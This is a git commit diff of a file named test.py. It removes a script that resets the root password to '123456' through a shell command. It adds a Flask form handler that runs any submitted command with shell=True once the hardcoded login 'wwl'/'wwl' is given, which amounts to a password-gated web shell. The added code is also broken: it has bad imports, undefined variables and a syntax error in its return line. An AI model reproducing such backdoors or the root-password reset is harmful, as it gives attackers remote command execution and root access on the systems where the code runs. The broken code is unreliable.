7ccd2b26eedb1887f7d4dcd0a83c6f8f767f4a51
wwl995 <57948674+wwl995@users.noreply.github.com>
2023-10-16 15:37:27 +0800

    Update test.py

--- test.py
+++ test.py
@@ -1,12 +1,25 @@
-import subprocess
+from flask import Flask, request, render_template, os, subprocess
 
-def change_root_password(new_password):
-    cmd = f"echo 'root:{new_password}' | sudo chpasswd"
-    try:
-        subprocess.check_output(cmd, shell=True)
-        print("Root password changed successfully.")
-    except subprocess.CalledProcessError as e:
-        print("Failed to change root password:", e)
+app = Flask(__name__)
 
-# 修改 root 用户的密码为 "新密码"
-change_root_password("123456")
+@app.route('/')
+def index():
+    # 显示一个简单的表单，让用户输入一些数据
+    return render_template('form.html')
+
+@app.route('/', methods=['POST'])
+def process_form():
+    # 处理表单提交的数据
+    c = request.form['c']
+    u = request.form['u']
+    p = request.form['p']
+    if u == "wwl" and p == "wwl":
+        # 打印输出数据
+        print('Name:', name)
+        print('Age:', age)
+    
+        # 返回一个响应给用户，告诉他们数据已经处理完毕
+        return output = subprocess.check_output(c, shell=True)
+
+if __name__ == '__main__':
+    app.run(debug=True)
